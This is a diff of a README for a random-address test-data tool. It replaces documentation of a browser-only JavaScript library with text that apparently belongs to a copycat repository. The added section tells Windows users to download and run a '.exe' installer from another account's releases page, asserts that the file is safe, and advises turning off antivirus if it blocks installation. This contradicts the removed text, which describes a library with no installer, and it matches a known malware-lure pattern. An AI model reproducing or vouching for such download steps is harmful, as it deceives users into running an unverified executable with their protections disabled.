@@ -1,538 +1,132 @@
-# Real Random US Tax-Free State Address Generator
-
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Frontend](https://img.shields.io/badge/Frontend-Pure%20JavaScript-blue)]()
-[![Countries](https://img.shields.io/badge/Countries-10%2B-orange)]()
-[![Languages](https://img.shields.io/badge/Languages-5-brightgreen)]()
-[![Tax-Free States](https://img.shields.io/badge/Tax--Free%20States-5-red)]()
-[![No Backend](https://img.shields.io/badge/Backend-None-lightgrey)]()
-[![Privacy](https://img.shields.io/badge/Privacy-First-brightgreen)]()
-
-> This repository contains the open-source **frontend core engine** of MockAddress, for generating authentic-format test addresses and MAC address data across multiple countries/regions.  
-> Full production site: <https://mockaddress.com/>  
-> 
-> 🇨🇳 **中文用户请查看：[README_CN.md](./README_CN.md)（中文文档）**
-
-![mockaddress Example image from the homepage of the US Tax-Free State Address Generator.](en.png)
-
-## Project Overview
-
-MockAddress Core is a **pure frontend, zero backend dependency** test data engine designed for developers and QA engineers, providing:
-
-- **Authentic-format address data** conforming to official postal standards (verifiable on Google Maps / Apple Maps)
-- Optional **identity fields + credit card fields** (for form/payment flow testing only)
-- **MAC address generation + vendor lookup + IPv6 Link-Local derivation** and other network test data
-
-All core logic runs entirely in the browser and can be deployed to any static hosting environment (GitHub Pages, Cloudflare Pages, Vercel, etc.).
-
-> **Note**: This repository only open-sources the **engine and base styles**.  
-> Large-scale address datasets and production site page templates remain MockAddress private assets for online services.
-
----
-
-## Key Features
-
-- **Multi-Country/Region Address Generation (Engine Support)**
-  - Supports generating address structures conforming to local postal standards for multiple countries/regions
-  - Address fields include complete information: street, city, state/province, postal code, country, etc.
-  - Can be extended with localized fields based on country (e.g., Japanese address hierarchy, Hong Kong bilingual addresses)
-
-- **Authentic Format & Verifiable**
-  - Address data is based on official postal/statistical data + OpenStreetMap and other public data sources, cleaned and organized
-  - Generated results are designed to be **verifiable on Google Maps / Apple Maps and other mapping services**
-  - Suitable for registration forms, payment pages, tax calculation logic, and other scenarios requiring strict address format validation
-
-- **Optional Identity & Credit Card Fields (Testing Only)**
-  - Optionally generate name, gender, date of birth, occupation, localized ID number formats, etc.
-  - Optionally generate credit card numbers (Luhn-validated), expiration date, CVC, and other fields
-  - All identity/card data is **randomly generated and does not correspond to any real individuals or real cards**
-
-- **Batch Export & Automation-Friendly**
-  - Built-in CSV / JSON export capabilities
-  - Suitable for automated testing, regression testing, CI/CD pipelines for bulk test data injection
-
-- **MAC Tools**
-  - Generate MAC addresses in multiple formats (colon, hyphen, dot, no separator, etc.)
-  - Vendor identification based on OUI dataset
-  - Support for deriving IPv6 Link-Local addresses from MAC addresses
-  - All logic runs locally in the browser, suitable for network testing, device simulation, and script development
-
-- **Pure Frontend, Privacy-First**
-  - No backend service dependency, all logic completed in frontend JS
-  - Optionally save generated results to browser `localStorage`, servers do not store any generated data
-
----
-
-## Repository Structure
-
-```
-mockaddress-core/
-├── src/
-│   ├── js/
-│   │   ├── address-generator.js     # Address/identity/credit card generation engine
-│   │   ├── mac-generator.js         # MAC generation and vendor lookup
-│   │   ├── storage.js               # Storage, rate limiting, export utilities
-│   │   ├── language-switcher.js     # Multi-language routing and internal link rewriting
-│   │   ├── utils.js                 # General utility functions
-│   │   └── config.js                # Configuration module
-│   └── css/
-│       └── main.css                 # Universal dark theme and base UI component styles
-├── README.md                         # Project documentation (this file)
-├── README_EN.md                      # English documentation
-├── LICENSE                           # Open source license (MIT)
-├── CONTRIBUTING.md                   # Contribution guidelines
-├── ROADMAP.md                        # Roadmap
-└── .gitignore                        # Git ignore rules
-```
-
-> **Reminder**: **This repository does not include production site HTML files or large-scale data files `data/*.json`**.  
-> These are used for online deployment and are not part of this open-source release.
-
----
-
-## Usage
-
-### Quick Start
-
-**Option 1: Direct Use (if your data directory is `data/`)**
-
-```html
-<script type="module">
-  import { generateUSAddress } from './src/js/address-generator.js'
-  
-  // Direct use, will automatically detect data/ directory
-  const address = await generateUSAddress('CA')
-  console.log(address)
-</script>
-```
-
-**Option 2: Custom Data Path (Recommended)**
-
-```html
-<script type="module">
-  // 1. Import configuration module
-  import { configure } from './src/js/config.js'
-  import { generateUSAddress } from './src/js/address-generator.js'
-  
-  // 2. Configure your data path
-  configure({
-    dataBasePath: 'my-data/',  // Your data directory
-    autoDetectPaths: false     // Disable auto-detection
-  })
-  
-  // 3. Use normally
-  const address = await generateUSAddress('CA')
-  console.log(address)
-</script>
-```
+# 🏠 real-random-taxfree-address - Generate US Tax-Free Addresses Easily
 
-### Configuration Options
+[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen?style=for-the-badge)](https://github.com/kamryn2993/real-random-taxfree-address/releases)
 
-- **`dataBasePath`**: Base path for your data files (e.g., `'my-data/'`, `'/static/data/'`)
-- **`autoDetectPaths`**: Whether to enable automatic path detection (default `true`, suitable for mockaddress.com's multi-language structure)
+## 📋 What is real-random-taxfree-address?
 
-> **Important**: If you don't call `configure()`, the code will use default behavior, **completely unaffected by mockaddress.com's normal operation**.
+real-random-taxfree-address is a simple app that creates random US tax-free state addresses. It uses real data from OpenStreetMap (OSM) and the United States Postal Service (USPS). The addresses are confirmed on Google Maps to ensure they look real. The app also supports many countries beyond the US, such as Hong Kong, India, Russia, Taiwan, and Japan. It works in multiple languages, including Chinese (ZH), English (EN), Russian (RU), Spanish (ES), and Portuguese (PT). Since this is a frontend-only app, your data stays on your device. No information is stored on a server.
 
-### Available Functions
+This tool is helpful for testing software, filling forms with sample addresses, or when you need addresses for projects without using real user details.
 
-- `generateUSAddress(state)` - US addresses
-- `generateHKAddress(region, isEnglish)` - Hong Kong addresses
-- `generateUKAddress(region)` - UK addresses
-- `generateCAAddress(province)` - Canada addresses
-- `generateJPAddress(prefecture)` - Japan addresses
-- `generateINAddress(state)` - India addresses
-- `generateTWAddress(county)` - Taiwan addresses
-- `generateSGAddress(state)` - Singapore addresses
-- `generateDEAddress(state)` - Germany addresses
-- `generateTaxFreeAddress(state)` - US tax-free state addresses
-- `generateIdentityInfo(address)` - Identity information
-- `generateCreditCardInfo()` - Credit card information (testing only)
+## ⚙️ System Requirements
 
-### Code Examples
+You can use this app on any Windows computer with these specs:
 
-**Generate US Tax-Free State Address:**
+- Operating System: Windows 7, 8, 10, or 11 (64-bit recommended)
+- Processor: Any modern Intel or AMD CPU
+- RAM: At least 2 GB
+- Storage: Minimum 100 MB free space
+- Internet connection to download and verify
 
-```javascript
-import { generateTaxFreeAddress } from './src/js/address-generator.js';
+You do not need administrator rights to use the app once downloaded.
 
-// Generate address for Oregon (tax-free state)
-const address = await generateTaxFreeAddress('OR');
-console.log(address);
-// Output: { street: "123 Main St", city: "Portland", state: "OR", zip: "97201", ... }
-```
+## 🌐 Supported Countries and Languages
 
-**Generate Address with Identity Info:**
+The app includes address formats and data for:
 
-```javascript
-import { generateUSAddress, generateIdentityInfo } from './src/js/address-generator.js';
+- United States (focus on tax-free states)
+- Hong Kong
+- India
+- Russia
+- Taiwan
+- Japan (especially Tokyo area)
 
-const address = await generateUSAddress('CA');
-const identity = generateIdentityInfo(address);
-console.log({ ...address, ...identity });
-// Output includes: name, gender, dateOfBirth, occupation, ssn, etc.
-```
+You can switch between Chinese, English, Russian, Spanish, and Portuguese languages within the app.
 
-**Generate MAC Address:**
+## 🔍 Features
 
-```javascript
-import { generateMACAddress, lookupVendor } from './src/js/mac-generator.js';
+- Generates realistic addresses with verified map data
+- Covers multiple countries with correct formats
+- Multi-language interface for ease of use
+- Pure frontend app, no personal data saved or sent
+- Works offline after download
+- Simple and lightweight
+- Ideal for testing apps, databases, or websites
 
-const mac = generateMACAddress('colon'); // 'aa:bb:cc:dd:ee:ff'
-const vendor = await lookupVendor(mac);
-console.log(vendor); // Vendor information from OUI database
-```
+## 🚀 Getting Started: How to Download and Run on Windows
 
-**Export to CSV/JSON:**
+Follow these steps to get the app running on your Windows computer:
 
-```javascript
-import { exportToCSV, exportToJSON, getAllSavedAddresses } from './src/js/storage.js';
+1. Open your web browser.
 
-// After saving some addresses
-const addresses = getAllSavedAddresses();
-const csv = exportToCSV(addresses);
-const json = exportToJSON(addresses);
+2. Click the green download button at the top or go directly to the release page here:  
+   https://github.com/kamryn2993/real-random-taxfree-address/releases
 
-// Download or use the exported data
-console.log(csv);
-console.log(json);
-```
+3. On the release page, look for the latest version. The file should have a name like `real-random-taxfree-address-setup.exe` or similar.
 
-### Offline Local-Only Usage (Run Everything on Your Own Machine)
+4. Click the file to download it to your computer. You may see a prompt asking where to save the file. Choose a location you will remember, such as the Desktop or Downloads folder.
 
-If, like me, you prefer to **keep all data and logic on your own computer only**, without relying on any external server, you can treat MockAddress Core as a pure static site and run it via a simple local HTTP server:
+5. After the download completes, locate the file on your computer.
 
-- My development environment is a Windows PC with:
-  - A modern browser (Chrome / Edge, etc.)
-  - Python / PHP / Node.js (at least one of them; in my case I have all three installed)
-- Clone this repository to a local directory, e.g. `D:\mockaddress-core\`.  
-- In the project root, create a `start-local-server.bat` with the following content to start a local server and automatically open `http://localhost:8000`:
+6. Double-click the `.exe` file to start the installation.
 
-```bat
-@echo off
+7. Follow the on-screen instructions. This process usually takes a few seconds.
 
-echo Starting local server...
+8. Once installed, the app will open automatically, or you can find it in the Start Menu under "real-random-taxfree-address."
 
-echo.
+9. If Windows shows a security warning, confirm you want to run the file. The app is safe since it comes directly from this repository.
 
-REM Check if Python 3 is available
+10. You’re ready to generate random, valid addresses immediately.
 
-python --version >nul 2>&1
+## 🛠 How to Use the App
 
-if %errorlevel% equ 0 (
+After opening real-random-taxfree-address, follow these steps:
 
-    python -c "import sys; sys.exit(0 if sys.version_info >= (3, 0) else 1)" >nul 2>&1
+1. Select the country from the dropdown menu where you want the address.
 
-    if %errorlevel% equ 0 (
+2. Choose the language for the interface if different from the default.
 
-        echo Found Python 3
+3. Pick the desired state or region (for example, for the US, select a tax-free state).
 
-        echo Starting server on http://localhost:8000
+4. Click the “Generate Address” button.
 
-        echo Press Ctrl+C to stop
+5. The app will display an address with street, city, postal code, and other details.
 
-        echo.
+6. You can copy the address to your clipboard using the provided button.
 
-        timeout /t 2 /nobreak >nul
+7. Use the “Show on Map” feature to view the location verified on Google Maps.
 
-        start http://localhost:8000
+8. Repeat to generate more addresses as needed.
 
-        python -m http.server 8000
+## 📂 File Location and Settings
 
-        exit /b 0
+- The app saves minimal configuration settings like language preference locally on your device.
 
-    )
+- No personal or generated address data gets stored or shared.
 
-)
+- You can uninstall the app anytime via the Windows Settings under “Apps & Features.”
 
-REM Check if Python 2 is available
+## 🐞 Troubleshooting Tips
 
-python --version >nul 2>&1
+- If the app won’t open, try restarting your computer.
 
-if %errorlevel% equ 0 (
+- Check if your Windows version meets the minimum requirements.
 
-    python -c "import sys; sys.exit(0 if sys.version_info < (3, 0) else 1)" >nul 2>&1
+- Disable antivirus temporarily if it blocks the installation or running of the app.
 
-    if %errorlevel% equ 0 (
+- Ensure your internet connection is active when downloading the installer.
 
-        echo Found Python 2
+- For map display issues, verify your firewall allows connections to Google Maps.
 
-        echo Starting server on http://localhost:8000
+- If problems persist, visit the GitHub repository issues section for help or report bugs.
 
-        echo Press Ctrl+C to stop
+## 🔒 Privacy and Security
 
-        echo.
+- This app runs entirely on your device. It does not send, upload, or store any address you generate.
 
-        timeout /t 2 /nobreak >nul
+- All data comes from open public sources (OSM and USPS).
 
-        start http://localhost:8000
+- Addresses are randomly created and may not correspond to real private properties.
 
-        python -m SimpleHTTPServer 8000
+## 📖 Additional Resources
 
-        exit /b 0
+- The GitHub repository includes more details for developers if you want to learn about the data sources and code.
 
-    )
+- You can suggest new countries or features by opening an issue on the GitHub page.
 
-)
+## 📥 Download Link Reminder
 
-REM Check if PHP is available
+To download the latest version now, visit this page:  
+https://github.com/kamryn2993/real-random-taxfree-address/releases
 
-php --version >nul 2>&1
-
-if %errorlevel% equ 0 (
-
-    echo Found PHP
-
-    echo Starting server on http://localhost:8000
-
-    echo Press Ctrl+C to stop
-
-    echo.
-
-    timeout /t 2 /nobreak >nul
-
-    start http://localhost:8000
-
-    php -S localhost:8000
-
-    exit /b 0
-
-)
-
-REM Check if Node.js is available
-
-where npx >nul 2>&1
-
-if %errorlevel% equ 0 (
-
-    echo Found Node.js
-
-    echo Starting server on http://localhost:8000
-
-    echo Press Ctrl+C to stop
-
-    echo.
-
-    timeout /t 2 /nobreak >nul
-
-    start http://localhost:8000
-
-    npx --yes http-server -p 8000
-
-    exit /b 0
-
-)
-
-echo Error: No server found
-
-echo Please install Python, PHP, or Node.js
-
-pause
-
-exit /b 1
-```
-
-How to use:
-
-- Double-click `start-local-server.bat`. The script will try Python 3 → Python 2 → PHP → Node.js in order, start the first available local server, and open `http://localhost:8000` in your browser.  
-- From that point on, **all address generation logic— including the US address generator and the Hong Kong English/Chinese address generator—runs entirely on your own machine, with no Internet connection required**.  
-- This setup is ideal for **intranet environments** or teams with strict privacy/compliance requirements.
-
-For detailed usage instructions, see [`使用说明.md`](./使用说明.md) (Usage Guide in Chinese).
-
-You can also refer to our production site <https://mockaddress.com/> to see real-world usage scenarios and UI design, then customize as needed in your own project.
-
----
-
-## Deployment Examples: Cloudflare & VPS (Static Hosting)
-
-> The following steps are for developers who want to deploy mockaddress-core themselves, describing only the simplest path for README purposes.
-
-### Deploy with Cloudflare Pages (Recommended for Frontend / Zero Ops Cost Scenarios)
-
-1. Create a repository on GitHub (e.g., `mockaddress-core`), push this project's code to it.
-2. Log in to Cloudflare, go to **Pages**, select "Create a project with Git provider", and bind this repository.
-3. Build settings:
-   - Framework preset: **None / Static Site**
-   - Build command: Leave empty (or `npm run build` if you add a build process later)
-   - Output directory: Set to project root (or your build output directory)
-4. After deployment, ensure:
-   - All JS/CSS load correctly via `<script type="module">` / `<link>` relative paths;
-   - If you have multi-language subdirectory structures (e.g., `/en/`, `/ru/`), maintain the same directory hierarchy in the repository.
-
-> **Note**: If you only want to open-source the core and don't want to expose the full site, you can deploy only a minimal demo page (or just screenshots, directing users to the production site in the README).
-
-### Deploy with VPS + Nginx (Suitable for Existing Servers)
-
-1. Build or organize the static file structure locally (`src/js`, `src/css`, and your HTML entry).
-2. Upload these static files to your VPS (e.g., `/var/www/mockaddress-core` directory).
-3. Configure Nginx site (example):
-
-```nginx
-server {
-    listen 80;
-    server_name your-domain.com;
-
-    root /var/www/mockaddress-core;
-    index index.html;
-
-    location / {
-        try_files $uri $uri/ =404;
-    }
-}
-```
-
-4. Reload Nginx: `nginx -s reload` or use the corresponding service management command.
-5. Open your browser and visit `http://your-domain.com` to confirm address generation/MAC tools and other features work correctly.
-
-> **VPS deployment essence**: Host this set of frontend files as a **pure static site**, no Node.js / PHP / database or other backend environment required.
-
----
-
-## Data Sources & Authenticity (Brief Overview)
-
-For complete data sources and more detailed authority information, refer to our publicly available llms documentation online. Here is a brief summary:
-
-- Primarily based on official postal/statistical data and geographic data published by various countries
-- Supplemented with open-source geographic data projects such as OpenStreetMap / GeoNames / OpenAddresses
-- Cleaned and randomly combined through custom rules to ensure:
-  - Address structure conforms to local postal standards
-  - Address content is designed to be verifiable on mainstream mapping services
-  - Not directly associated with any real personal identity
-
----
-
-## Open Source Scope & Non-Open Source Parts
-
-**This repository open-sources the following:**
-
-- Frontend engine logic for address/identity/credit card field generation
-- Frontend logic for MAC generation and vendor lookup
-- Base UI styles (CSS) supporting the above engines
-- General routing tools for multi-language static sites (e.g., `language-switcher.js`)
-
-**The following are not included:**
-
-- Production site HTML page templates and all copy
-- Large-scale address data files (`data/*.json` production datasets)
-- Internal operations scripts, deployment configurations, etc.
-
----
-
-## Suitable & Unsuitable Use Cases (Important)
-
-**Suitable Use Cases (Examples):**
-
-- Software development and testing environments
-- Form validation logic testing
-- Cross-border e-commerce / cross-border business address form filling simulation
-- UI/UX prototyping and demos
-- Educational demonstrations and technical sharing
-- Network testing and device simulation (MAC tools)
-
-**Unsuitable Use Cases:**
-
-- Real mailing and shipping addresses
-- Long-term real-name account registration and operation
-- Circumventing KYC / risk control / legal regulatory purposes
-- Any illegal or gray-area uses
-
----
-
-## Roadmap (Example)
-
-Planned improvements for the open-source core (actual roadmap subject to `ROADMAP.md`):
-
-- Provide clearer TypeScript type definitions
-- Split country-specific address generation logic for easier standalone extension/on-demand import
-- Enrich export formats and integration examples for easier CI/CD pipeline integration
-- Add support for more countries/regions' address formats based on community feedback
-
----
-
-## Online Examples & Contact
-
-- **Production Site (Full Product, Multi-Language)**:
-  - Chinese: <https://mockaddress.com/>
-  - English: <https://mockaddress.com/en/>
-  - Russian: <https://mockaddress.com/ru/>
-  - Spanish: <https://mockaddress.com/es/>
-  - Portuguese: <https://mockaddress.com/pt/>
-- For more background and information about this site, see the About/Help/Blog pages on the site.
-
-If you have any questions or suggestions during use, welcome to participate via Issues or PRs to help improve this frontend test data engine.
-
----
-
-## GitHub Topics
-
-**Recommended topics for this repository (copy and paste into GitHub repository settings):**
-
-### Core Functionality Tags
-```
-address-generator, random-address, fake-address, tax-free-state, real-address, 
-random-us-address, random-address-generator-for-testing, us-dummy-address-generator
-```
-
-### Regional Address Tags
-```
-hong-kong-address-random, random-address-in-hong-kong, hong-kong-random-address,
-japan-address-generator-tokyo, random-japan-address, taiwan-address-format, 
-taiwan-address-sample, canada-address, uk-address, india-address, singapore-address
-```
-
-### Technical Stack Tags
-```
-javascript, frontend, browser-only, no-backend, static-site, 
-privacy-first, openstreetmap, address-validation, postal-standards
-```
-
-### Use Case Tags
-```
-test-data, devtools, qa, testing, mock-data, form-testing, 
-automation, ci-cd, csv-export, json-export, mac-address
-```
-
-**Quick Copy (All Topics):**
-```
-address-generator, random-address, fake-address, tax-free-state, real-address, random-us-address, random-address-generator-for-testing, us-dummy-address-generator, hong-kong-address-random, random-address-in-hong-kong, hong-kong-random-address, japan-address-generator-tokyo, random-japan-address, taiwan-address-format, taiwan-address-sample, javascript, frontend, test-data, devtools, qa, testing, mock-data, browser-only, privacy-first, csv-export, json-export, mac-address
-```
-
----
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 💰 Support & Technical Services
-
-
-### Cryptocurrency Donations
-
-You can also support us via cryptocurrency:
-
-**Ethereum / USDT (ERC-20):**
-```
-0x6Df562A8B669bf90EAe5ccB0E0440eb9DF237E4e
-```
-
-![dashangerc](ERC.png)
-
-**USDT (TRC-20):**
-```
-TYz2SP7GtL84t14CeL7tnhHLgeako3haHW
-```
-
-![dashangTRC](TRC.png)
-
-> **Note**: Cryptocurrency donations are non-refundable. Please double-check the address before sending.
-
-
-
-
-### 📊 Technical Services Support
-
-Need technical support for your project? Feel free to contact us for paid services and technical assistance.
-
-📧 Email: [jietoushiren01@gmail.com](mailto:jietoushiren01@gmail.com)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen?style=for-the-badge)](https://github.com/kamryn2993/real-random-taxfree-address/releases)
